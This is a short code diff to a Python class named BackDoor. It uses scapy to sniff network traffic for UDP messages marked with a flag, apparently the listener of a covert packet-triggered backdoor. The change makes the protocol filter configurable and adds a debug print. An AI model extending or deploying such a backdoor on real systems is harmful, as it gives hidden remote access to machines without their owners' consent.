@@ -211,7 +211,7 @@ class BackDoor:
 
     def sniff_init(self) -> None:
         try:
-            sniff(filter="udp", prn=lambda p: self.filter_packets(p), store=False)
+            sniff(filter=self.proto, prn=lambda p: self.filter_packets(p), store=False)
         except PermissionError:
             print("Permission error! Run as sudo or admin!")
             sys.exit()
@@ -230,6 +230,7 @@ class BackDoor:
         self.craft_packet(msg)
 
     def filter_packets(self, packet) -> None:
+        print("got packet")
         try:
             msg = packet[UDP].load.decode()
             if UDP in packet and msg.startswith(self.flag_begin) \
